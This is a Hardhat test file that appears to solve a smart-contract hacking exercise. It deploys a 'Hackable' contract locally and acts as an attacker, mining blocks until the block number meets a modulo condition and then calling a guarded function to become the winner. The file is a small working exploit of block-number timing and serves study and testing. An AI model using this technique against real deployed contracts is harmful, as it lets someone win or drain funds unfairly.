import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';

const LAST_X_DIGITS = 45;
const MOD = 100;
describe('Hackable', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;
  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('Hackable', deployer)
    ).deploy(LAST_X_DIGITS, MOD);

    await target.deployed();

    target = target.connect(attacker);
  });

  it('attack', async () => {
    while (true) {
      const currentBlockNumber = await ethers.provider.getBlock('latest');
      const nextBlockNumber = currentBlockNumber.number + 1;

      if (nextBlockNumber % MOD === LAST_X_DIGITS) {
        const tx = await target.cantCallMe();
        await tx.wait();
        break;
      }

      await network.provider.send('evm_mine');
    }

    expect(await target.winner()).to.equal(attacker.address);
  });
});
